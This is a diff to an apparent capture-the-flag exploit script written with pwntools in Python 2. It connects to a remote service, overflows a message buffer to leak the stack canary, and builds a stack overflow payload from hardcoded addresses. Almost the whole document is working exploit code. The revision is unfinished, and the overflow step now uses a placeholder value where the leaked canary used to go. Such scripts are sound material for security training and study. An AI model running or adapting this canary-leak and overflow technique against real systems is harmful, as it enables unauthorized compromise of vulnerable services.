@@ -4,6 +4,7 @@ import time
 """===============    Configuration    ================"""
 
 class Exploit():
+
     recvMsgAdr = "0x080488b1"
     sendMsgAdr = "0x08048907"
     exitCmp    = "0x08048b57"
@@ -32,8 +33,7 @@ class Exploit():
             self.r = remote(self.host, self.port)
 
     def menu(self, choice):
-        if self.r.can_recv():
-           self.r.recvuntil('> ')
+        self.r.recvuntil('> ')
         self.r.sendline( str(choice))
         time.sleep(0.1)
         if choice == 3:
@@ -42,35 +42,25 @@ class Exploit():
             print colored(self.vp.recv(), "red")
 
 
-    def getCanary(self):
-        #First leak to get the canary
+    def getLeak(self):
         self.menu(1)
-        self.r.recv()
-        data = "A"*self.bytesToCanary
-        self.r.sendline(data)
+        #"Input Your Message : "
+        #49 is the lowest amount of a's to get the canary from strlen
+        data = 'A'*self.bytesToCanary
+        self.r.sendafter(': ', data)
+        self.r.sendafter(': ', str(data))
         time.sleep(0.1)
-        leak = self.r.recv()
-        #The +1 and +3 is because u32 can take 4 arguyments
-        self.canary = u32("\x00" + leak[
-            self.bytesToCanary + 1: self.bytesToCanary + 4
-        ])
-        log.info("canary {}".format(colored(hex(self.canary), "green")))
+        leak = self.r.recvline().strip()
+        log.info(leak)
 
-    def getStackLeak(self):
-        self.menu(1)
-        self.r.recv()
-        stackOff = self.bytesToCanary +8
-        payload = 'A' * self.bytesToCanary
-        payload += 'B' * 8
-        self.r.sendline(payload)
-        leak = self.r.recv()
-        self.stackLeak = u32( leak[ stackOff+4:stackOff+8 ])
-        log.info("stackAddr: {}".format(colored(hex(self.stackLeak), "green")))
+        #The +1 and +3 is because u32 can take 4 arguyments
+        self.canary = u32("\x00"+leak[self.bytesToCanary+1:self.bytesToCanary+1+3])
+
 
     def overflow(self):
         #canary is checked at point offset 15-19
         filler = 'a'*40
-        data = filler + self.canary
+        data = filler + p32(0xDEADBEEF)
         #data = self.canary
 
         #data=fit({},filler='ABCDEFHIJKLMNOPQRSTUVWYXZabcdefghijklmnopqrstuvwyxz', length=100)
@@ -100,7 +90,7 @@ if __name__ == "__main__":
     exp = Exploit()
     #exp.checkStackCanary()
 
-    exp.getCanary()
-    exp.getStackLeak()
+    exp.getLeak()
+    exp.menu(3)
 
 
